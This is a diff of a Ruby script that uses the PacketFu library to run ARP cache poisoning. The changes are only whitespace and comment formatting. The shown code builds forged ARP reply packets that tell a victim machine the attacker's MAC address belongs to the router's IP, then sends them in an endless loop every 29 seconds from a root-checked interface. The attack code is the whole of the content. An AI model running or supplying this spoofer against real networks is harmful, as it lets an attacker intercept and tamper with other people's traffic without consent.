@@ -9,16 +9,16 @@ require 'socket'
 def poison(lip, lmac, vip, vmac, rip, int_name)
    puts "Sending ARP Packet Spoof Every 29 Seconds…"
    x = PacketFu::ARPPacket.new(:flavor => "Linux")
-     x.eth_saddr = lmac  # your MAC Address
-     x.eth_daddr = vmac  # victim MAC Address
+     x.eth_saddr = lmac     # your MAC Address
+     x.eth_daddr = vmac     # victim MAC Address
      x.arp_saddr_mac = lmac # your MAC Address
      x.arp_daddr_mac = vmac # victim MAC Address
-     x.arp_saddr_ip = rip # Router IP Address
-     x.arp_daddr_ip=  vip # Victim IP Address
-     x.arp_opcode = 2 # ARP Reply Code
-   while true do # Infinite Loop created
-     x.to_w(int_name) # Put Packet to wire  interface
-      sleep(29) # interval in seconds, change for your preference 
+     x.arp_saddr_ip = rip   # Router IP Address
+     x.arp_daddr_ip=  vip   # Victim IP Address
+     x.arp_opcode = 2       # ARP Reply Code
+   while true do 
+     x.to_w(int_name)       # Put Packet to wire  interface
+      sleep(29)             # interval in seconds, change for your preference 
    end
 end
 
@@ -43,7 +43,7 @@ unless Process.uid.zero?
   exit 0
 end
 
-#select interface to use and start setup
+# select interface to use and start setup
 interfaces = Socket.getifaddrs.map { |i| i.name }.compact.uniq
 list = Hash[(0...interfaces.size).zip interfaces]
 list.each do |l, v|
